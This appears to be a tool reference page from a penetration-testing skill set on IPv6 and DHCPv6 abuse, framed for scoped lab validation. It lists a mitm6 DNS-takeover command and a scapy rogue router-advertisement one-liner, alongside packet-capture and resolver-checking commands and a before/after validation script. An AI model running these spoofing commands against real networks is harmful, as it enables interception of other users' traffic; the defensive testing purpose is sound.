# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`network-protocol-attacks-ipv6-and-dhcp-abuse`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `mitm6` | `mitm6 -d corp.example -i eth0 --no-ra --host-allowlist 10.20.30.50` | Scope DHCPv6 DNS assignment to one host in a lab | Linux |
| `tshark` | `tshark -i eth0 -f 'udp port 546 or udp port 547' -Y 'dhcpv6.msgtype == 2'` | Prove an Advertise reached the victim | Cross-platform |
| `Get-DnsClientServerAddress` | `Get-DnsClientServerAddress -AddressFamily IPv6 -InterfaceAlias Ethernet` | Victim-side resolver state | Windows |
| `ndpmon` or switch `show ipv6 nd` | `show ipv6 neighbors` on the access switch | Router and neighbour state at the device | Network device |
| `scapy` | `send(IPv6(dst='ff02::1')/ICMPv6ND_RA()/ICMPv6NDOptRDNSS(dns=['2001:db8::53']))` | Lab-only proof that an RA is accepted without guard | Linux |

## Minimal Lab Validation Script

Snapshot the endpoint's IPv6 resolver state before and after a single bounded advertisement, and print only the fields that changed.

```python
import json, subprocess

def dns_v6():
    ps = ("Get-DnsClientServerAddress -AddressFamily IPv6 | "
          "Select-Object InterfaceAlias,ServerAddresses | ConvertTo-Json -Compress")
    out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                         capture_output=True, text=True).stdout
    return json.loads(out or "[]")

before = dns_v6()
input("run the single authorised advertisement, then press enter")
after = dns_v6()
print("before", before)
print("after ", after)
print("changed", before != after)
```

## Flag Notes

- `--no-ra` restricts the change to DNS assignment, avoiding route changes that could break the victim's connectivity.
- `--host-allowlist` limits the advertisement to named victims, which is what keeps a test inside scope.
- `-Y 'dhcpv6.msgtype == 2'` filters to Advertise, the message type that assigns configuration.
